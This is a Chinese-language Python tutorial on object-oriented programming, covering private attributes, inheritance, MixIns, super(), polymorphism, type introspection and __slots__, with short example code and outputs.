【 类属性与方法 】
类的私有属性
__private_attrs:两个下划线开头,声明该属性为私有,不能在类的外部被使用或直接访问。在类内部的方法中使用时self.__private_attrs。

类的方法
在类的内部,使用def关键字可以为类定义一个方法,与一般函数定义不同,类方法必须包含参数self,且为第一个参数

类的私有方法
__private_method:两个下划线开头,声明该方法为私有方法,不能在类的外部调用。在类的内部调用self.__private_methods

</pre><textarea>
class JustCounter:
    __secretCount = 0  # 私有变量
    publicCount = 0    # 公开变量

    def count(self):
        self.__secretCount += 1
        self.publicCount += 1
        print(self.__secretCount)

counter = JustCounter()
counter.count()
counter.count()
print(counter.publicCount)
print(counter.__secretCount)  # 报错,实例不能访问私有变量,AttributeError: JustCounter instance has no attribute '__secretCount'

</textarea><pre>
单下划线、双下划线、头尾双下划线说明:
__foo__: 定义的是特殊方法,一般是系统定义名字,类似 __init__()之类的。
_foo: 以单下划线开头的表示的是protected类型的变量,即保护类型只能允许其本身与子类进行访问,不能用于from module import *
__foo: 双下划线的表示的是私有类型(private)的变量,只能是允许这个类本身进行访问了。

</pre><pre>
【 Python内置类属性 】
__dict__ : 类的属性(包含一个字典,由类的数据属性组成)
__doc__ :类的文档字符串
__name__: 类名
__module__: 类定义所在的模块(类的全名是'__main__.className',如果类位于一个导入模块mymod中,那么className.__module__ 等于 mymod)
__bases__ : 类的所有父类构成元素(包含了一个由所有父类组成的元组)

每个值都是一个对象,因此具有类也称为类型,并存储为object.__class__
print('str'.__class__)  # < class 'str'>
print(str.__class__)    # < class 'type'>

</pre><textarea>
class Employee:
   '所有员工的基类'
   empCount = 0

   def __init__(self, name, salary):
      self.name = name
      self.salary = salary
      Employee.empCount += 1

   def displayCount(self):
     print("Total Employee %d" % Employee.empCount)

   def displayEmployee(self):
      print("Name : ", self.name,  ", Salary: ", self.salary)

print("Employee.__doc__:", Employee.__doc__)
print("Employee.__name__:", Employee.__name__)
print("Employee.__module__:", Employee.__module__)
print("Employee.__bases__:", Employee.__bases__)
print("Employee.__dict__:", Employee.__dict__)

# 执行以上代码输出结果如下:
Employee.__doc__: 所有员工的基类
Employee.__name__: Employee
Employee.__module__: __main__
Employee.__bases__: ()
Employee.__dict__: {'__module__': '__main__', 'displayCount': < function displayCount at 0x10a939c80>, 'empCount': 0, 'displayEmployee': < function displayEmployee at 0x10a93caa0>, '__doc__': '\xe6\x89\x80\xe6\x9c\x89\xe5\x91\x98\xe5\xb7\xa5\xe7\x9a\x84\xe5\x9f\xba\xe7\xb1\xbb', '__init__': < function __init__ at 0x10a939578>}

</textarea><pre>
【 python对象销毁(垃圾回收) 】
Python使用了引用计数这一简单技术来跟踪和回收垃圾。
在Python内部记录着所有使用中的对象各有多少引用,一个内部跟踪变量,称为一个引用计数器。
当对象被创建时就创建了一个引用计数, 当这个对象不再需要时, 也就是说这个对象的引用计数变为0时, 它被垃圾回收。但是回收不是"立即"的, 由解释器在适当的时机,将垃圾对象占用的内存空间回收。

a = 40      # 创建对象  <40>
b = a       # 增加引用, <40> 的计数
c = [b]     # 增加引用.  <40> 的计数
del a       # 减少引用 <40> 的计数
b = 100     # 减少引用 <40> 的计数
c[0] = -1   # 减少引用 <40> 的计数

垃圾回收机制不仅针对引用计数为0的对象,同样也可以处理循环引用的情况。
循环引用指的是,两个对象相互引用,但是没有其他变量引用他们,这种情况下仅使用引用计数是不够的。Python的垃圾收集器实际上是一个引用计数器和一个循环垃圾收集器。作为引用计数的补充, 垃圾收集器也会留心被分配的总量很大(及未通过引用计数销毁的那些)的对象。 在这种情况下, 解释器会暂停下来, 试图清理所有未引用的循环。

</pre>析构函数__del__ ,__del__在对象销毁的时候被调用,当对象不再被使用时__del__方法运行<textarea>
#!/usr/bin/python
# -*- coding: UTF-8 -*-

class Point:
   def __init__( self, x=0, y=0):
      self.x = x
      self.y = y
   def __del__(self):
      class_name = self.__class__.__name__
      print(class_name, "销毁")

pt1 = Point()
pt2 = pt1
pt3 = pt1
print(id(pt1), id(pt2), id(pt3))   # 打印对象的id
del pt1
del pt2
del pt3

# 以上实例运行结果如下:
3083401324 3083401324 3083401324
Point 销毁

</textarea>
</div>

<div id="extend">
<h4>类的继承</h4><pre>
继承是面向对象的三大特征之一,也是实现代码复用的重要手段。继承经常用于创建和现有类功能类似的新类,又或是新类只需要在现有类基础上添加一些成员(属性和方法),但又不想直接将现有类代码复制给新类

面向对象的编程带来的主要好处之一是代码的重用,实现这种重用的方法之一是通过继承机制
定义一个class的时候,可以从某个现有的class继承,通过继承新创建的class称为子类或派生类(Subclass),而被继承的class称为基类、父类或超类(Base class、Super class)

由于子类是一种特殊的父类,因此父类包含的范围总比子类包含的范围要大,所以可以认为父类是大类,而子类是小类。
从实际意义上看,子类是对父类的扩展,子类是一种特殊的父类。从这个意义上看,使用继承来描述子类和父类的关系是错误的,用扩展更恰当
从子类的角度来看,子类扩展(extend)了父类;但从父类的角度来看,父类派生(derive)出子类。也就是说,扩展和派生所描述的是同一个动作,只是观察角度不同而已

继承语法
class 派生类名(基类名):

# Python的继承是多继承机制,即一个子类可以同时拥有多个直接父类
class 类名(父类1, 父类2, ...):
    #类定义部分

在python中继承机制的一些特点:
1、如果在子类中需要父类的构造方法就需要显式的调用父类的构造方法,或不重写父类的构造方法
2、在调用基类的方法时需要加上基类的类名前缀,且需要带上self参数变量,区别在于类中调用普通函数时并不需要带上self参数
3、Python总是首先查找对应类型的方法,如果它不能在派生类中找到对应的方法,它才开始到基类中逐个查找
4、继承还可以一级一级地继承下来,而任何类最终都可以追溯到根类object
5、如果在定义一个Python类时,并未显式指定这个类的直接父类则这个类默认继承object类,object 类是所有类的父类,要么是直接父类,要么是间接父类

</pre><textarea>
#!/usr/bin/env python3
# -*- coding: UTF-8 -*-

class Parent:                  # 定义父类
   parentAttr = 100
   def __init__(self):
      print("调用父类构造函数")

   def parentMethod(self):
      print('调用父类方法')

   def setAttr(self, attr):
      Parent.parentAttr = attr

   def getAttr(self):
      print("父类属性 :", Parent.parentAttr)

   def rewrite(self):
      print("父类被重写的方法")

class Child(Parent):            # 定义子类
   def __init__(self):
      print("调用子类构造方法")

   def childMethod(self):
      print('调用子类方法')

   def rewrite(self):            # 父类方法的功能不能满足需求,可以在子类重写父类的方法,通过继承实现oop多态
      print("子类重写父类的方法")

class Son(Parent):
   pass

c = Child()          # 实例化子类
c.childMethod()      # 调用子类的方法
c.parentMethod()     # 调用父类方法
c.setAttr(200)       # 再次调用父类的方法 - 设置属性值
c.getAttr()          # 再次调用父类的方法 - 获取属性值
c.rewrite()          # 重写父类的方法

print('**********')
s = Son()
s.parentMethod()

# 以上代码执行结果如下:
调用子类构造方法
调用子类方法
调用父类方法
父类属性 : 200
子类重写父类的方法
**********
调用父类构造函数
调用父类方法

</textarea><pre>
【 多重继承 】
继承是面向对象编程的一个重要的方式,因为通过继承子类就可以扩展父类的功能。

如果在继承元组中列了一个以上的类,那么它就被称作"多重继承" 。
派生类的声明,与他们的父类类似,继承的基类列表跟在类名之后
class SubClassName (ParentClass1[, ParentClass2, ...]):

继承多个类
class A:        # 定义类 A
class B:         # 定义类 B
class C(A, B):   # 继承类 A 和 B

Python虽然在语法上明确支持多继承,但通常推荐如果不是很有必要,则尽量不要使用多继承,而是使用单继承,这样可以保证编程思路更清晰,而且可以避免很多麻烦

</pre>如果多个父类中包含了同名的方法,此时会发生什么呢？此时排在前面的父类中的方法会"遮蔽"排在后面的父类中的同名方法,由于Item排在前面,因此Item中定义的方法优先级更好,Python会优先到Item父类中搜寻方法,一旦在Item父类中搜寻到目标方法,Python就不会继续向下搜寻了<textarea>
class Item:
    def info (self):
        print("Item中方法:", '这是一个商品')

class Product:
    def info (self):
        print("Product中方法:", '这是一个工业产品')

class Mouse(Item, Product): # ①
    pass

m = Mouse()
m.info()    # Item中方法: 这是一个商品

</textarea><pre>
【 MixIn模式 混入(mix-in) 】
在设计类的继承关系时通常主线都是单一继承下来的,例如Ostrich继承自Bird。但如果需要"混入"额外的功能可以通过多重继承实现,比如让Ostrich除了继承自Bird外,再同时继承Runnable,这种设计通常称之为MixIn。

为了更好地看出继承关系,把Runnable和Flyable改为RunnableMixIn和FlyableMixIn,还可以定义出肉食动物CarnivorousMixIn和植食动物HerbivoresMixIn,让某个动物同时拥有好几个MixIn:
class Dog(Mammal, RunnableMixIn, CarnivorousMixIn): pass

MixIn的目的就是给一个类增加多个功能,这样在设计类时优先考虑通过多重继承来组合多个MixIn的功能,而不是设计多层次的复杂的继承关系。

Python自带的很多库也使用了MixIn,Python自带了TCPServer和UDPServer这两类网络服务,要同时服务多个用户就必须使用多进程或多线程模型,这两种模型由ForkingMixIn和ThreadingMixIn提供,通过组合就可以创造出合适的服务来。
这样一来不需要复杂而庞大的继承链,只要选择组合不同的类的功能就可以快速构造出所需的子类

</pre><textarea>
# 比如编写一个多进程模式的TCP服务
class MyTCPServer(TCPServer, ForkingMixIn):
    pass

# 编写一个多线程模式的UDP服务
class MyUDPServer(UDPServer, ThreadingMixIn):
    pass

# 如果打算搞一个更先进的协程模型,可以编写一个CoroutineMixIn:
class MyTCPServer(TCPServer, CoroutineMixIn):
    pass

</textarea><textarea>
class Vehicle(object):
    pass

class PlaneMixin(object):
    def fly(self):
        print 'I am flying'

class Airplane(Vehicle, PlaneMixin):
    pass

# Airplane类实现了多继承,不过它继承的第二个类为PlaneMixin,而不是Plane,这个并不影响功能,但会告诉后来读代码的人这个类是一个Mixin类。所以从含义上理解,Airplane只是一个Vehicle,不是一个Plane。这个Mixin告诉别人,这个类是作为功能添加到子类中,而不是作为父类

</textarea><pre>
可以利用Python的多继承特性实现一种叫做Mixin的类
Mixin类只包含了一组特定的函数集合,而我们将会将其与其他类进行混合,从而生成一个适用于实际需要的新类

</pre><textarea>
class Displayer():
    def display(self, message):
        print(message)

# Mixin类,也就是说这个类的方法就是想要与Displayer类进行混合,然后生成想要的新类MySubClass的
# Mixin类根本就没有继承任何除了Object类之外的父类,Object类没有display方法,那么LoggerMixin类究竟是调用了谁的display方法呢
class LoggerMixin():
    def log(self, message, filename='logfile.txt'):
        # with open(filename, 'a') as fh: fh.write(message)
        print('log:', message)

    def display(self, message):
        super().display(message)
        self.log(message)

# MySubClass多继承了LoggerMixin类和Displayer类
class MySubClass(LoggerMixin, Displayer):
    def log(self, message):
        super().log(message, filename='subclasslog.txt')

subclass = MySubClass()
subclass.display("This string will be shown and logged in subclasslog.txt")

# 输出
This string will be shown and logged in subclasslog.txt
log: This string will be shown and logged in subclasslog.txt

</textarea><pre>
在多继承的环境下,super()有相对来说更加复杂的含义。它会查看继承链,使用一种叫做Methods Resolution Order(方法解析顺序)的方式来决定调用最近的继承父类的方法

MySubClass.display()调用触发了是这么一系列的行为：
1. MySubClass.display()方法被解析为LoggerMixin.display()方法的调用,因为对于MySubClass类来说,在继承链上的两个父类LoggerMixin和Displayer中LoggerMixin是最近的,因此调用它的display()方法。

2. LoggerMixin.display()方法调用了super().display(),查看MySubClass的继承链,应该调用Displayer类的display()方法的
当LoggerMixin.display()中调用了super().display()时,它会尝试去寻找属于当前类MySubClass的继承链,MySubClass类的继承连是LoggerMixin,然后Displayer。所以就找到了Displayer的display()方法。

3. LoggerMixin类还调用了self.log()方法。这个看似好像要直接调用LoggerMixin的log方法,其实不然。
LoggerMixin的display()方法在当前语境中的self,其实是MySubClass类的对象,因此对于MySubClass类的对象,想要调用log方法,是直接调用自己类中的log方法,也就是MySubClass.log()方法,而不是LoggerMixin.log()方法的。
而又因为MySubClass.log()方法调用了super().log()方法,这才根据继承链寻找最近的父类,才找到了LoggerMixin类中的log()方法进行调用。

self.method()将会先在当前类中查看method()方法,如果没有,就在继承链中进行查找,查找顺序就是继承的顺序从左到右,直到method()方法被找到。super().method()与self.method()是差不多的,只是super().method()需要跳过当前类而已

LoggerMixin类是无法单独使用的,它必须要和一个拥有display()函数定义的类一起混合使用。这也就是为什么它被称作是Mixin类的原因,它总是需要与其他类混合来加强其他类

</pre><pre>
【 父类方法重写 】
子类包含与父类同名的方法的现象被称为方法重写(Override),也被称为方法覆盖。可以说子类重写了父类的方法,也可以说子类覆盖了父类的方法

</pre><textarea>
class Bird:
    # Bird类的fly()方法
    def fly(self):
        print("我在天空里自由自在地飞翔...")

class Ostrich(Bird):
    # 重写Bird类的fly()方法
    def fly(self):
        print("我只能在地上奔跑...")

# 创建Ostrich对象
os = Ostrich()
# 执行Ostrich对象的fly()方法,将输出"我只能在地上奔跑..."
os.fly()

</textarea><pre>
使用未绑定方法调用被重写的方法
如果在子类中调用重写之后的方法,Python总是会执行子类重写的方法,不会执行父类中被重写的方法。如果需要在子类中调用父类中被重写的实例方法,那该怎么办呢？
Python类相当于类空间,因此Python类中的方法本质上相当于类空间内的函数。所以即使是实例方法,Python也允许通过类名调用。区别在于:在通过类名调用实例方法时,Python不会为实例方法的第一个参数self自动绑定参数值,而是需要程序显式绑定第一个参数self。这种机制被称为未绑定方法。

</pre>通过使用未绑定方法即可在子类中再次调用父类中被重写的方法<textarea>
class BaseClass:
    def foo (self):
        print('父类中定义的foo方法')

class SubClass(BaseClass):
    # 重写父类的foo方法
    def foo (self):
        print('子类重写父类中的foo方法')
    def bar (self):
        print('执行bar方法')
        # 直接执行foo方法,将会调用子类重写之后的foo()方法
        self.foo()
        # 使用类名调用实例方法(未绑定方法)调用父类被重写的方法
        BaseClass.foo(self)

sc = SubClass()
sc.bar()
# 输出:
执行bar方法
子类重写父类中的foo方法
父类中定义的foo方法

</textarea><pre>
【 super()函数:调用父类的构造方法 】
Python的子类也会继承得到父类的构造方法,但如果子类有多个直接父类,那么会优先选择排在最前面的父类的构造方法

</pre><textarea>
class Employee :
    def __init__ (self, salary):
        self.salary = salary
    def work (self):
        print('普通员工正在写代码,工资是:', self.salary)

class Customer:
    def __init__ (self, favorite, address):
        self.favorite = favorite
        self.address = address
    def info (self):
        print('我是一个顾客,我的爱好是: %s,地址是%s' % (self.favorite, self.address))

# Manager继承了Employee、Customer
class Manager (Employee, Customer):
    pass

m = Manager(25000)
m.work()  # 普通员工正在写代码,工资是: 25000
m.info()  # AttributeError: 'Manager' object has no attribute 'favorite'

</textarea><pre>
为了让Manager能同时初始化两个父类中的实例变量,Manager应该定义自己的构造方法,即重写父类的构造方法。Python要求如果子类重写了父类的构造方法,那么子类的构造方法必须调用父类的构造方法

子类的构造方法调用父类的构造方法有两种方式:
1、使用未绑定方法,这种方式很容易理解。因为构造方法也是实例方法,当然可以通过这种方式来调用。
2、使用super()函数调用父类的构造方法。

当子类继承多个父类是,super()函数只能用来调用第一个父类的构造方法,而其它父类的构造方法只能使用未绑定的方式调用。

在交互式解释器中输入help(super)查看super()函数的帮助信息,可以看到如下输出信息:
class super(object)
|  super() -> same as super(__class__, < first argument>)
|  super(type) -> unbound super object
|  super(type, obj) -> bound super object; requires isinstance(obj, type)
|  super(type, type2) -> bound super object; requires issubclass(type2, type)
|  Typical use to call a cooperative superclass method:
|  class C(B):
|      def meth(self, arg):
|          super().meth(arg) #①
|  This works for class methods too:
|  class C(B):
|      @classmethod
|      def cmeth(cls, arg):
|          super().cmeth(arg) #②
...

从上面介绍可以看出,super其实是一个类,因此调用super()的本质就是调用super类的构造方法来创建super对象。

从上面的帮助信息可以看到,使用super()构造方法最常用的做法就是不传入任何参数(这种做法与super(type, obj)的效果相同),然后通过super对象的方法既可调用父类的实例方法,也可调用父类的类方法。在调用父类的实例方法时,程序会完成第一个参数self的自动绑定。在调用类方法时,程序会完成第一个参数cls的自动绑定

</pre><textarea>
class Employee :
    def __init__ (self, salary):
        self.salary = salary
    def work (self):
        print('普通员工正在写代码,工资是:', self.salary)

class Customer:
    def __init__ (self, favorite, address):
        self.favorite = favorite
        self.address = address
    def info (self):
        print('我是一个顾客,我的爱好是: %s,地址是%s' % (self.favorite, self.address))

# Manager继承了Employee、Customer
class Manager(Employee, Customer):
    # 重写父类的构造方法
    def __init__(self, salary, favorite, address):
        print('--Manager的构造方法--')
        # 通过super()函数调用父类的构造方法
        super().__init__(salary)
        # 与上一行代码的效果相同
        #super(Manager, self).__init__(salary)
        # 使用未绑定方法调用父类的构造方法
        Customer.__init__(self, favorite, address)

# 创建Manager对象
m = Manager(25000, 'IT产品', '广州')
m.work()  #①
m.info()  #②
# 输出:
--Manager的构造方法--
普通员工正在写代码,工资是: 25000
我是一个顾客,我的爱好是: IT产品,地址是广州

</textarea>

<h4>多态原理及实现</h4><pre>
对于弱类型的语言来说,变量并没有声明类型,因此同一个变量完全可以在不同的时间引用不同的对象。当同一个变量在调用同一个方法时,完全可能呈现出多种行为(具体呈现出哪种行为由该变量所引用的对象来决定),这就是所谓的多态(Polymorphism)

</pre>从上面的运行结果可以看出,同一个变量x在执行同一个move()方法时,由于x指向的对象不同,因此它呈现出不同的行为特征,这就是多态<textarea>
class Bird:
    def move(self, field):
        print('鸟在%s上自由地飞翔' % field)

class Dog:
    def move(self, field):
        print('狗在%s里飞快的奔跑' % field)

# x变量被赋值为Bird对象
x = Bird()
# 调用x变量的move()方法
x.move('天空')

# x变量被赋值为Dog对象
x = Dog()
# 调用x变量的move()方法
x.move('草地')

</textarea>多态是一种非常灵活的编程机制<pre>
class Canvas:
    '定义一个 Canvas(画布)类,这个画布类定义一个 draw_pic() 方法,该方法负责绘制各种图形'
    def draw_pic(self, shape):
        print('--开始绘图--')
        shape.draw(self)

'''
Canvas的draw_pic()方法需要传入一个shape参数,该方法就是调用shape参数的draw()方法将自己绘制到画布上。
从上面程序来看,Canvas的draw_pic()传入的参数对象只要带一个draw()方法就行,至于该方法具有何种行为,到底执行怎样的绘制行为,这与draw_pic()方法是完全分离的,这就为编程增加了很大的灵活性。下面程序定义了三个图形类,并为它们都提供了draw()方法,这样它们就能以不同的行为绘制在画布上,这就是多态的实际应用
'''

class Rectangle:
    def draw(self, canvas):
        print('在%s上绘制矩形' % canvas)

class Triangle:
    def draw(self, canvas):
        print('在%s上绘制三角形' % canvas)

class Circle:
    def draw(self, canvas):
        print('在%s上绘制圆形' % canvas)

c = Canvas()
# 传入Rectangle参数,绘制矩形
c.draw_pic(Rectangle())
# 传入Triangle参数,绘制三角形
c.draw_pic(Triangle())
# 传入Circle参数,绘制圆形
c.draw_pic(Circle())

# 输出
--开始绘图--
在<__main__.Canvas object at 0x0000021CA36364A8>上绘制矩形
--开始绘图--
在<__main__.Canvas object at 0x0000021CA36364A8>上绘制三角形
--开始绘图--
在<__main__.Canvas object at 0x0000021CA36364A8>上绘制圆形

</pre>

<h4>获取对象的类型和方法</h4><pre>
【 type() 】
class type(object)
class type(name, bases, dict)
传入一个参数时返objec的类型。 返回值是一typ对象,通常object.__class_所返回的对象相同。
推荐使用isinstance()内置函数来检测对象的类型,因为它会考虑子类的情况。

传入三个参数时返回一个新的type对象。 这在本质上是class语句的一种动态形式。 name字符串即类名并且会成为__name__属性;bases元组列出基类并且会成为__bases__属性;而dict字典为包含类主体定义的命名空间并且会被复制到一个标准字典成为__dict__属性。

</pre>下面两条语句会创建相同的type对象<textarea>
>>> class X:
...     a = 1
...
>>> X = type('X', (object,), dict(a=1))

</textarea><pre>
基本类型都可以用type()判断对象类型

print(type(123))     # < class 'int'>
print(type('str'))   # < class 'str'>
print(type(None))    # < class 'NoneType'>
print(type(True))    # < class 'Bool'>
print(type([]))      # < class 'list'>
print(type({}))      # < class 'dict'>

指向函数或类的变量也可以用type()判断对象类型
print(type(abs))     # < class 'builtin_function_or_method'>

</pre>Foo是一个class,它的类型就是type,而f是一个实例,它的类型就是class Foo<textarea>
class Foo:
    pass
f = Foo()
print(type(Foo))     # < class 'type'>
print(type(f))       # < class '__main__.Foo'>

# hello.py
class Foo:
    pass

# python cli
>>>fromhello import Foo
>>> f = Foo()
>>> print(type(Foo))   # < class 'type'>
>>> print(type(f))     # < class 'hello.Foo'>

</textarea><pre>
type()函数返回对应的Class类型
print(type(123) == int)   # True
print(type('abc') == str) # True

判断基本数据类型可以直接写int、str等,但如果要判断一个对象是否是函数可以使用types模块中定义的常量
>>> import types
>>> def fn():
...     pass
...
>>> type(fn)==types.FunctionType
True
>>> type(abs)==types.BuiltinFunctionType
True
>>> type(lambda x: x)==types.LambdaType
True
>>> type((x for x in range(10)))==types.GeneratorType
True

【 isinstance() 】
对于class的继承关系来说,使用type()就很不方便,可以使用isinstance()函数判断class的类型

定义一个class实际上就定义了一种数据类型,和Python自带的数据类型如str、list、dict没什么两样,都可以使用issubclass()或isinstance()方法来检测,通过使用这两个函数,程序可以方便地先执行检查,然后才调用方法,这样可以保证程序不会出现意外情况
issubclass(cls, class_or_tuple):检查cls是否为后一个类或元组包含的多个类中任意类的子类
isinstance(obj, class_or_tuple):检查obj是否为后一个类或元组包含的多个类中任意类的对象
使用isinstance()来检查一个实例的类型: isinstance(obj, int)仅会在obj.__class__为int或某个派生自int的类时为True。
使用issubclass()来检查类的继承关系: issubclass(bool, int)为True,因为bool是int的子类,但issubclass(float, int)为False,因为float不是int的子类


l = list()                # l是list类型
p = Parent()              # p是Parent类型,可以说变量p指向的对象的数据类型是Parent
c = Child()               # c是Dog类型
s = Son()                 # s是Animal类型
>>> isinstance(l, list)   # True
>>> isinstance(s, Son)    # True
>>> isinstance(c, Child)  # True
>>> isinstance(s, Parent) # True
>>> isinstance(c, Parent) # True

能用type()判断的基本类型也可以用isinstance()判断,并且还可以判断一个变量是否是某些类型中的一种
总是优先使用isinstance()判断类型,可以将指定类型及其子类"一网打尽"

>>> isinstance('a', str)                  # True
>>> isinstance(123, int)                  # True
>>> isinstance(b'a', bytes)               # True
>>> isinstance([1, 2, 3], (list, tuple))  # True
>>> isinstance((1, 2, 3), (list, tuple))  # True

</pre><textarea>
# 定义一个字符串
hello = "Hello";
print('"Hello"是否是str类的实例: ', isinstance(hello, str))              # True
print('"Hello"是否是object类的实例: ', isinstance(hello, object))        # True
print('str是否是object类的子类: ', issubclass(str, object))              # True
print('"Hello"是否是tuple类及其子类的实例: ', isinstance(hello, tuple))   # False
print('str是否是tuple类的子类: ', issubclass(str, tuple))                # False

# 定义一个列表
my_list = [2, 4]
print('[2, 4]是否是list类的实例: ', isinstance(my_list, list))              # True
print('[2, 4]是否是object类及其子类的实例: ', isinstance(my_list, object))   # True
print('list是否是object类的子类: ', issubclass(list, object))               # True
print('[2, 4]是否是tuple类及其子类的实例: ', isinstance([2, 4], tuple))      # False
print('list是否是tuple类的子类: ', issubclass(list, tuple))                 # False

# 第二个参数使用元组
data = (20, 'fkit')
print('data是否为列表或元组: ', isinstance(data, (list, tuple)))                      # True
print('str是否为list或tuple的子类: ', issubclass(str, (list, tuple)))                 # False
print('str是否为list或tuple或object的子类 ', issubclass(str, (list, tuple, object)))  # True

</textarea><pre>
Python为所有类都提供了一个__bases__属性,通过该属性可以查看该类的所有直接父类,该属性返回所有直接父类组成的元组
Python还为所有类都提供了一个__subclasses__()方法,通过该方法可以查看该类的所有直接子类,该方法返回该类的所有子类组成的列表

</pre><textarea>
class A:
    pass
class B:
    pass
class C(A, B):
    pass

print('类A的所有父类:', A.__bases__)  # 类A的所有父类: (< class 'object'>,)
print('类B的所有父类:', B.__bases__)  # 类B的所有父类: (< class 'object'>,)
print('类C的所有父类:', C.__bases__)  # 类C的所有父类: (< class '__main__.A'>, < class '__main__.B'>)

print('类A的所有子类:', A.__subclasses__())  # 类A的所有子类: [< class '__main__.C'>]
print('类B的所有子类:', B.__subclasses__())  # 类B的所有子类: [< class '__main__.C'>]

</textarea><pre>
【 dir() 】
如果要获得一个对象的所有属性和方法,可以使用dir()函数,它返回一个包含字符串的list

>>> dir('ABC')
['__add__', '__class__',..., '__subclasshook__', 'capitalize', 'casefold',..., 'zfill']

类似__xxx__的属性和方法在Python中都是有特殊用途的,比如__len__方法返回长度。在Python中如果调用len()函数试图获取一个对象的长度,实际上在len()函数内部,它自动去调用该对象的__len__()方法,所以下面的代码是等价的:

>>> len('ABC')
3
>>> 'ABC'.__len__()
3

</pre>仅仅把属性和方法列出来是不够的,配合getattr()、setattr()以及hasattr(),可以直接操作一个对象的状态<textarea>
>>> class MyObject(object):
...     def __init__(self):
...         self.x = 9
...     def power(self):
...         return self.x * self.x
...
>>> obj = MyObject()

# 获取对象的属性
>>> hasattr(obj, 'x')     # 有属性'x'吗？
True
>>> obj.x
9
>>> hasattr(obj, 'y')     # 有属性'y'吗？
False
>>> setattr(obj, 'y', 19) # 设置一个属性'y'
>>> hasattr(obj, 'y')     # 有属性'y'吗？
True
>>> getattr(obj, 'y')     # 获取属性'y'
19
>>> obj.y                 # 获取属性'y'
19

# 如果试图获取不存在的属性,会抛出AttributeError的错误:
>>> getattr(obj, 'z') # 获取属性'z'
Traceback (most recent call last):
  File "< stdin>", line 1, in < module>
AttributeError: 'MyObject' object has no attribute 'z'

# 可以传入一个default参数,如果属性不存在,就返回默认值:
>>> getattr(obj, 'z', 404) # 获取属性'z',如果不存在,返回默认值404
404

# 获得对象的方法:
>>> hasattr(obj, 'power') # 有属性'power'吗？
True
>>> getattr(obj, 'power') # 获取属性'power'
< bound method MyObject.power of <__main__.MyObject object at 0x10077a6a0>>
>>> fn = getattr(obj, 'power') # 获取属性'power'并赋值到变量fn
>>> fn # fn指向obj.power
< bound method MyObject.power of <__main__.MyObject object at 0x10077a6a0>>
>>> fn() # 调用fn()与调用obj.power()是一样的
81

</textarea><pre>
通过内置的一系列函数可以对任意一个Python对象进行剖析,拿到其内部的数据。要注意的是,只有在不知道对象信息的时候才会去获取对象信息。如果可以直接写:
sum = obj.x + obj.y
就不要写:
sum = getattr(obj, 'x') + getattr(obj, 'y')

</pre>希望从文件流fp中读取图像,首先要判断该fp对象是否存在read方法,如果存在则该对象是一个流,如果不存在则无法读取。hasattr()就派上了用场<textarea>
def readImage(fp):
    if hasattr(fp, 'read'):
        return readData(fp)
    return None

</textarea><pre>
【 inspect模块 】
inspect模块也提供了许多有用的函数,来获取活跃对象的信息。比方说可以查看一个对象的成员,只需运行:

import inspect
print(inspect.getmembers(str))
# Output: [('__add__', < slot wrapper '__add__' of ... ...

</pre>

<h4>实例属性和类属性</h4><pre>
由于Python是动态语言,根据类创建的实例可以任意绑定属性。
给实例绑定属性的方法是通过实例变量或通过self变量:

</pre><textarea>
class Student(object):
    def __init__(self, name):
        self.name = name

s = Student('Bob')
s.score = 90

</textarea><pre>
如果Student类本身需要绑定一个属性,可以直接在class中定义属性,这种属性是类属性,归Student类所有,但类的所有实例都可以访问到
在编写程序的时候,千万不要对实例属性和类属性使用相同的名字,因为相同名称的实例属性将屏蔽掉类属性,但是当删除实例属性后,再使用相同的名称,访问到的将是类属性
实例属性属于各个实例所有,互不干扰;
类属性属于类所有,所有实例共享一个属性;

</pre><textarea>
>>> class Student(object):
...     name = 'Student'
...
>>> s = Student()       # 创建实例s
>>> print(s.name)       # 打印name属性,因为实例并没有name属性,所以会继续查找class的name属性
Student
>>> print(Student.name) # 打印类的name属性
Student
>>> s.name = 'Michael'  # 给实例绑定name属性
>>> print(s.name)       # 由于实例属性优先级比类属性高,因此它会屏蔽掉类的name属性
Michael
>>> print(Student.name) # 但是类属性并未消失,用Student.name仍然可以访问
Student
>>> del s.name          # 如果删除实例的name属性
>>> print(s.name)       # 再次调用s.name,由于实例的name属性没有找到,类的name属性就显示出来了
Student

</textarea>

<h4>基础重载方法</h4><pre>
__init__ ( self [,args...] )
构造函数
简单的调用方法: obj = className(args)

__del__( self )
析构方法, 删除一个对象
简单的调用方法 : del obj

__repr__( self )
转化为供解释器读取的形式
简单的调用方法 : repr(obj)

__str__( self )
用于将值转化为适于人阅读的形式
简单的调用方法 : str(obj)

__cmp__ ( self, x )
对象比较
简单的调用方法 : cmp(obj, x)

</pre>【 运算符重载 】<textarea>
class Vector:
   def __init__(self, a, b):
      self.a = a
      self.b = b

   def __str__(self):
      return 'Vector (%d, %d)' % (self.a, self.b)

   def __add__(self,other):
      return Vector(self.a + other.a, self.b + other.b)

v1 = Vector(2,10)
v2 = Vector(5,-2)
print(v1 + v2)

# 执行结果:
Vector(7,8)

</textarea>

<h4>__slots__:限制类实例动态添加属性和方法</h4><pre>
正常情况下当定义了一个class创建了一个class的实例后,可以给该实例绑定任何属性和方法,这就是动态语言的灵活性

</pre><textarea>
class Student(object):
    pass

# 给实例绑定一个属性:
s = Student()
s.name = 'Michael'       # 动态给实例绑定一个属性
print(s.name)            # Michael

# 给实例绑定一个方法:
def set_age(self, age):  # 定义一个函数作为实例方法
    self.age = age

from types import MethodType
s.set_age = MethodType(set_age, s) # 给实例绑定一个方法
s.set_age(25)                      # 调用实例方法
print(s.age)                       # 25

# 但是给一个实例绑定的方法,对另一个实例是不起作用的:
s2 = Student()                     # 创建新的实例
s2.set_age(25)                     # AttributeError: 'Student' object has no attribute 'set_age'

# 为了给所有实例都绑定方法,可以给class绑定方法:
def set_score(self, score):
    self.score = score

Student.set_score = set_score
s.set_score(100)
print(s.score)                     # 100
s2.set_score(99)
print(s2.score)                    # 99

</textarea><pre>
通常情况下,上面的set_score方法可以直接定义在class中,但动态绑定允许在程序运行的过程中动态给class加上功能,这在静态语言中很难实现

Python的这种动态性固然有其优势,但也给程序带来了一定的隐患,即程序定义好的类,完全有可能在后面被其他程序修改,这就带来了一些不确定性。如果程序要限制为某个类动态添加属性和方法,则可通过__slots__属性来指定

【 使用__slots__ 】
如果想要限制实例的属性怎么办？比如只允许对Student实例添加name和age属性。
为了达到限制的目的,Python允许在定义class的时候,定义一个特殊的__slots__变量来限制该class实例能添加的属性
__slots__定义的属性仅对当前类实例起作用,对继承的子类是不起作用的
除非在子类中也定义__slots__,这样子类实例允许定义的属性就是自身的__slots__加上父类的__slots__

__slots__属性的值是一个元组,该元组的所有元素列出了该类的实例允许动态添加的所有属性名和方法名,对于Python而言方法相当于属性值为函数的属性

